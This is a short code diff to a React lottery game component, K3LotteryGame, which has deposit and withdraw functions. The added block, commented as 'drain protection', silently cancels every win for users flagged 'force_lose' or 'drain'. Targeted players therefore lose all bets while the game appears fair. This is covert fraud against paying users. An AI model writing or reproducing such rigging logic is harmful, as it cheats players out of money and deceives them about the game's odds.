@@ -175,6 +175,11 @@ export default function K3LotteryGame({ onClose, onOpenDeposit, onOpenWithdraw }
         return b;
       }));
 
+      // Targeted user drain protection: 100% loss for drain users
+      if (winPayout > 0 && (user?.force_result === 'force_lose' || user?.luck_mode === 'drain')) {
+        winPayout = 0;
+      }
+
       if (winPayout > 0) {
         adjustUserBalance(user.uid, winPayout);
         if (soundEnabled) soundManager.playWin();
